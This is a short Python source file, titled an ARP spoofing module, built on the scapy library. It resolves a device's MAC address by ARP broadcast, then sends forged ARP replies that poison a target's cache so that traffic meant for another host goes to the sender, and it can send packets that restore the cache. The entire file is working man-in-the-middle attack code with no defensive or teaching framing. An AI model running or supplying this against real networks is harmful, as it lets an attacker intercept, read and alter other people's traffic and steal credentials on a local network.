'''ARP Spoofing module'''

from scapy.all import ARP, Ether, send, srp


def get_mac_address(ip_address, interface):
    '''Get the MAC Address of a device from the IP Address'''
    arp_broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address)
    connected = srp(arp_broadcast, iface=interface, timeout=3, verbose=False)[0]

    if connected:
        return connected[0][1].src


def spoof_arp(target_ip, host_ip, target_mac, source_mac):
    '''Start ARP Spoofing'''
    arp_packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_packet, verbose=False)
    print('Sent to:', target_ip + ':', host_ip, 'is at', source_mac)


def clean_arp(target_ip, host_ip, target_mac, host_mac):
    '''Stop ARP Spoofing'''
    clean_packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(clean_packet, verbose=False)
    print('Sent to:', target_ip + ':', host_ip, 'is at', host_mac)
